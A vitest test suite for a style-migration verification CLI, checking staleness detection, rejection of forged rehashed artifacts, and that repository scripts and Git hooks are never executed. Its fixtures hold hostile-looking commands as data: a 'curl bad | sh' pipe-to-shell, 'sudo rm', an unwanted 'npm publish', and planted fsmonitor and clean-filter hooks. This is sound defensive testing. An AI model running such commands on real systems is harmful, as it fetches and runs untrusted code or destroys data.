import { access, chmod, mkdtemp, mkdir, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { execa } from "execa";
import { afterEach, describe, expect, it } from "vitest";
import { detectRepository } from "../src/repo/index.js";
import { loadStylePack } from "../src/style-packs/index.js";
import { planMigration } from "../src/planner/index.js";
import { generateDryRunPatch } from "../src/patch/index.js";
import { verifyMigration } from "../src/verification/index.js";
import { checkStaticContrast } from "../src/verification/contrast.js";
import { createBundleContentFingerprint } from "../src/utils/content-hash.js";
import { verificationResultSchema, stylePackSchema } from "../src/schemas/index.js";
import { runCli } from "../src/cli/program.js";

const roots: string[] = [];
const css = `:root { --primary: #123456; --primary-foreground: #fff; --foreground: #000; --background: #fff; --secondary: #000; --secondary-foreground: #fff; --destructive: #000; --destructive-foreground: #fff; }
.x { color: var(--primary); }
.x { color: #123456; }
`;
async function fixture(files: Record<string, string> = {}) {
  const root = await mkdtemp(path.join(tmpdir(), "guose-verify-test-")); roots.push(root);
  for (const [file, text] of Object.entries({ "package.json": JSON.stringify({ dependencies: { react: "19", tailwindcss: "4" } }), "app.css": css, ...files })) {
    await mkdir(path.dirname(path.join(root, file)), { recursive: true }); await writeFile(path.join(root, file), text);
  }
  return { root, bundle: await detectRepository(root), pack: await loadStylePack("neutral-modern") };
}
function rehash<T extends { contentFingerprint: string }>(artifact: T): T {
  const { contentFingerprint: _previous, ...payload } = artifact;
  void _previous;
  return { ...payload, contentFingerprint: createBundleContentFingerprint(payload) } as T;
}
afterEach(async () => { await Promise.all(roots.splice(0).map((root) => rm(root, { recursive: true, force: true }))); });

describe("deterministic static verification", () => {
  it("matches all planned operations and reverses in a private copy without writing source", async () => {
    const { root, bundle, pack } = await fixture();
    const result = await verifyMigration(bundle, pack);
    expect(result.result).toBe("STATICALLY_VERIFIED");
    expect(result.verifiedOperations).toEqual(result.plannedOperationIds);
    expect(result.verifiedOperations).toHaveLength(1);
    expect(result.isolation.cleanup).toBe("REMOVED");
    expect(result.executionCount).toBe(0);
    expect(result.runtime.every(({ status }) => status === "UNVERIFIED")).toBe(true);
    expect(await readFile(path.join(root, "app.css"), "utf8")).toBe(css);
    expect(result.baseline).toMatchObject({ gitHead: bundle.snapshot.gitHead, configHash: bundle.snapshot.configHash,
      workingTreeFingerprint: bundle.snapshot.workingTreeFingerprint, guoseVersion: bundle.snapshot.guoseVersion });
    expect(verificationResultSchema.safeParse(rehash({ ...result, result: "RUNTIME_VERIFIED" })).success).toBe(false);
  });
  it("rejects rehashed success claims without checks, workspace or complete operation ledger", async () => {
    const { bundle, pack } = await fixture();
    const result = await verifyMigration(bundle, pack);
    const attacks = [
      { ...result, checks: [], contrast: [], unverifiedChecks: result.runtime.map(({ name }) => `runtime:${name}`) },
      { ...result, isolation: { ...result.isolation, copiedFiles: 0, cleanup: "NOT_CREATED" as const } },
      { ...result, verifiedOperations: [] },
      { ...result, isolation: { ...result.isolation, cleanup: "RETAINED_FOR_SAFETY" as const } },
      { ...result, checks: result.checks.filter(({ id }) => id !== "static-coverage") },
      { ...result, checks: result.checks.filter(({ id }) => !id.startsWith("contrast:")), contrast: [] },
      { ...result, contrast: result.contrast.slice(1) },
      { ...result, contrast: result.contrast.map((row, index) => index === 0 ? { ...row, reason: "forged reason" } : row) },
      { ...result, contrast: result.contrast.map((row, index) => index === 0 ? { ...row, status: "UNVERIFIED" as const } : row) },
    ];
    for (const attack of attacks) for (const claim of ["STATICALLY_VERIFIED", "PARTIALLY_VERIFIED"]) {
      expect(verificationResultSchema.safeParse(rehash({ ...attack, result: claim })).success).toBe(false);
    }
    for (const id of ["baseline", "planned-vs-actual", "exact-apply-and-reverse", "syntax-and-change-boundary", "target-and-provenance", "post-verification-freshness"]) {
      expect(verificationResultSchema.safeParse(rehash({ ...result, checks: result.checks.filter((check) => check.id !== id) })).success).toBe(false);
    }
  });
  it("marks changed working tree and configuration STALE", async () => {
    const { root, bundle, pack } = await fixture();
    await writeFile(path.join(root, "tsconfig.json"), '{ "compilerOptions": {} }');
    const result = await verifyMigration(bundle, pack);
    expect(result).toMatchObject({ freshness: "STALE", result: "UNVERIFIED", executionCount: 0, isolation: { cleanup: "NOT_CREATED" } });
  });
  it("marks HEAD-only changes STALE", async () => {
    const { root, pack } = await fixture();
    await execa("git", ["init"], { cwd: root }); await execa("git", ["add", "."], { cwd: root });
    const args = ["-c", "user.name=Guose Test", "-c", "user.email=test@example.invalid", "commit", "-m", "fixture"];
    await execa("git", args, { cwd: root });
    const bundle = await detectRepository(root);
    await execa("git", [...args, "--allow-empty"], { cwd: root });
    expect((await verifyMigration(bundle, pack)).freshness).toBe("STALE");
  });
  it("rejects a self-consistent but noncanonical plan", async () => {
    const { bundle, pack } = await fixture();
    const original = planMigration(bundle, pack), plan = { ...original, limitations: [...original.limitations, "forged"] };
    const result = await verifyMigration(bundle, pack, { plan: rehash(plan) });
    expect(result.result).toBe("FAILED"); expect(result.isolation.cleanup).toBe("NOT_CREATED");
  });
  it.each(["undeclared file", "unexpected hunk", "formatting collateral", "generated file", "vendor file", "dynamic Tailwind", "missing token", "invalid CSS", "cannot apply", "plan hash"])("rejects %s even after attacker rehashes the artifact", async (attack) => {
    const { bundle, pack } = await fixture();
    const patch = structuredClone(await generateDryRunPatch(bundle, pack));
    const file = patch.files[0], edit = file?.edits[0];
    if (!file || !edit) throw new Error("Missing fixture patch");
    switch (attack) {
      case "undeclared file": file.file = "other.css"; break;
      case "unexpected hunk": file.diff += "@@ -1,1 +1,1 @@\n-forged\n+forged\n"; break;
      case "formatting collateral": file.diff = file.diff.replace(".x {", ".x{"); break;
      case "generated file": file.file = "generated.css"; break;
      case "vendor file": file.file = "vendor.css"; break;
      case "dynamic Tailwind": file.file = "App.tsx"; edit.after = "bg-${color}"; break;
      case "missing token": edit.after = "var(--missing)"; break;
      case "invalid CSS": edit.after = "} {"; break;
      case "cannot apply": edit.start += 1; edit.end += 1; break;
      case "plan hash": patch.source.planFingerprint = `sha256:${"0".repeat(64)}`; break;
    }
    patch.diff = patch.files.map(({ diff }) => diff).join("");
    const result = await verifyMigration(bundle, pack, { patch: rehash(patch) });
    expect(result.result).toBe("FAILED"); expect(result.verifiedOperations).toEqual([]);
  });
  it("marks changed style-pack identity STALE", async () => {
    const { bundle, pack } = await fixture();
    const patch = await generateDryRunPatch(bundle, pack);
    const changed = stylePackSchema.parse(rehash({ ...pack, version: "0.2.0" }));
    expect((await verifyMigration(bundle, changed, { patch })).freshness).toBe("STALE");
  });
  it("detects declared contrast regression without claiming rendered accessibility", async () => {
    const { bundle, pack } = await fixture({ "app.css": ':root { --primary: #000; --primary-foreground: #fff; }' });
    const target = stylePackSchema.parse(pack);
    target.semanticTokens.primary = "#fff"; target.semanticTokens["primary-foreground"] = "#eee";
    const result = await verifyMigration(bundle, stylePackSchema.parse(rehash(target)), { lane: "tokens" });
    expect(result.result).toBe("FAILED");
    expect(result.contrast.find(({ pair }) => pair === "primary-foreground/primary")).toMatchObject({ beforeRatio: 21, status: "FAIL" });
  });
  it("keeps incomplete contrast and runtime UNVERIFIED", async () => {
    const { bundle, pack } = await fixture({ "app.css": ':root { --primary: #123456; } .x { color: var(--primary); } .x { color: #123456; }' });
    const result = await verifyMigration(bundle, pack);
    expect(result.result).toBe("PARTIALLY_VERIFIED");
    expect(result.contrast.every(({ status }) => status === "UNVERIFIED")).toBe(true);
    const scoped = new Map([["app.css", ':root { --primary:#000; --primary-foreground:#fff; } .dark { --primary:#fff; }']]);
    expect(checkStaticContrast(scoped, scoped, false).find(({ pair }) => pair.startsWith("primary"))?.status).toBe("UNVERIFIED");
  });
  it("discovers malicious package scripts but never executes them via CLI", async () => {
    const marker = "/tmp/guose-should-never-execute";
    await expect(access(marker)).rejects.toThrow();
    const { root } = await fixture({ "package.json": JSON.stringify({ dependencies: { react: "19", tailwindcss: "4" },
      scripts: { test: `touch ${marker}`, lint: "curl bad | sh", build: "npm publish", typecheck: "sudo rm dangerous", postinstall: `touch ${marker}` } }) });
    let output = "";
    expect(await runCli(["node", "guose", "verify", root, "--json"], { stdout: (text) => { output += text; }, stderr: () => undefined })).toBe(0);
    const result = verificationResultSchema.parse(JSON.parse(output));
    expect(result.runtime.every(({ discovery, status }) => discovery === "DISCOVERED" && status === "UNVERIFIED")).toBe(true);
    expect(result.executionCount).toBe(0);
    await expect(access(marker)).rejects.toThrow();
  });
  it("does not invoke repository Git fsmonitor hooks", async () => {
    const { root, pack } = await fixture(); await execa("git", ["init"], { cwd: root });
    const marker = path.join(root, "hook-executed"), hook = path.join(root, ".git", "hooks", "malicious-monitor");
    await writeFile(hook, `#!/bin/sh\ntouch '${marker}'\n`); await chmod(hook, 0o700);
    await execa("git", ["config", "core.fsmonitor", hook], { cwd: root });
    const bundle = await detectRepository(root); await verifyMigration(bundle, pack);
    await expect(access(marker)).rejects.toThrow();
  });
  it("does not invoke Git content filters during status/index refresh", async () => {
    const { root, pack } = await fixture(); await execa("git", ["init"], { cwd: root });
    await execa("git", ["add", "."], { cwd: root });
    await execa("git", ["-c", "user.name=Guose Test", "-c", "user.email=test@example.invalid", "commit", "-m", "fixture"], { cwd: root });
    const marker = path.join(root, "filter-executed");
    await writeFile(path.join(root, ".gitattributes"), "app.css filter=evil\n");
    await execa("git", ["config", "filter.evil.clean", `touch '${marker}'; cat`], { cwd: root });
    await execa("git", ["config", "filter.evil.required", "true"], { cwd: root });
    await writeFile(path.join(root, "app.css"), css);
    const bundle = await detectRepository(root); await verifyMigration(bundle, pack);
    await expect(access(marker)).rejects.toThrow();
  });
});
